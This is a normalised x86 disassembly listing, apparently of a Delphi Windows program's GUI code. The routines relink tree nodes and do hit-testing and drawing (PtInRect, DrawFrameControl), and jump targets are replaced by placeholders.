mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_43d2c8
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_43d2c8
mov ecx ebx
pop edx
call sub_4124ac
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_434574
mov eax [ ebp - 0x4 ]
call sub_43d6fc
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_43d6fc
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_43d6fc
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_43d6fc
push ebx
mov ebx eax
mov eax ebx
call sub_43d204
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_43d18c
test al al
je r-xdata
mov eax ebx
call sub_43d238
pop ebx
retn
sub_43d738
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43d724
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43d1d4
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_43d728
mov edx esi
call sub_43d738
sub_43d774
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_43d6fc
mov edi eax
mov eax ebx
call sub_43d238
cmp edi eax
jl r-xdata
mov eax esi
call sub_43d3e4
mov eax [ esi + 0x1c ]
push eax
push sub_43f284
mov edx esi
call sub_43dab0
mov eax ebx
call sub_43d6fc
mov edi eax
mov eax esi
call sub_43d280
cmp edi eax
jle r-xdata
mov eax ebx
call sub_43d774
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_43d7e0
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_43d204
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_43d808
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4030f8
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_40344c
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d1b0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cba0
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_4231a8
mov edx eax
mov eax ebx
call sub_41cd1c
mov eax [ ebp - 0x4 ]
call sub_43d9d8
xor eax eax
push ebp
push sub_43d914
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4380c0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_43d3e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d91b
mov eax [ ebp - 0x4 ]
call sub_43d9dc
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_438084
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_43d91b
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_43f7ac
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_43d970
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_43e9dc
mov eax [ esi + 0x10 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_43d9f0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_43d9f0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_43d9f0
pop ecx
sub_43da48
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_43d9f0
pop ecx
sub_43da74
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_43da74
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_43da74
pop ecx
sub_43dac8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_43da48
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_43d334
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_43d334
push eax
mov edx 0x1
mov eax ebx
call sub_43d2c8
push eax
mov edx 0x2
mov eax ebx
call sub_43d2c8
pop edx
pop ecx
call sub_4124ac
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402b3c
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_43db4c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_43d584
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_4124ac
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_434574
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d1b0
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_43da48
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_43d1d4
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_43ea74
mov edx esi
mov eax ebx
call sub_43da48
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_434b58
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d1b0
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_434b44
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_43d334
mov edx eax
mov eax edi
call sub_43d724
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_43d334
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_43d334
mov edx eax
mov eax edi
call sub_43d724
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_43d334
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_43dd5c
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_43df04
jmp r-xdata
sub_43dd5c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d1b0
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_43d6fc
mov edx eax
mov eax ebx
call sub_43d724
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_43d724
mov eax [ esi + 0x64 ]
call sub_43d6fc
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_43edcc
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_43dab0
mov eax [ esi + 0x64 ]
call sub_43d6fc
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_43edcc
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_43dab0
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_43f150
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_43dab0
mov eax [ esi + 0x64 ]
call sub_43d6fc
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_43f284
xor edx edx
mov eax esi
call sub_43dab0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_43d724
adc edx 0x0
mov eax ebx
call sub_43d3e4
mov eax ebx
call sub_43d774
push esi
push sub_43f284
xor edx edx
mov eax esi
call sub_43dab0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_43df04
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_43d3e4
mov eax [ ebx + 0x14 ]
call sub_43d774
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_43df7c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_43d6fc
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_43d6fc
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_43d6fc
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_43d2c8
mov esi eax
mov edx 0x2
mov eax ebx
call sub_43d2c8
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_43d6fc
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_43d7d4
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_43d7fc
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43d7d4
call sub_43df7c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43d7fc
call sub_43df7c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_43d334
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_43d334
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_43e1a8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_4380c0
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_438084
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_41245c
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43e23c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_43e1a8
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_43d7fc
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_43da48
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_43d7fc
call sub_43df7c
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_43e2c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403e78
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4044c4
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_43e30c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43e504
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_43e9dc
mov eax [ ebp - 0x8 ]
call sub_43d9d8
xor edx edx
push ebp
push sub_43e4e7
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e4ee
mov eax [ ebp - 0x8 ]
call sub_43d9dc
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d1b0
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_43e2c4
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_403324
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_43d4d0
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_43e2c4
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_434ad4
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_4358a8
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_403128
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_43e514
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_412484
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41d4a0
push eax
call DrawFrameControl
pop edi
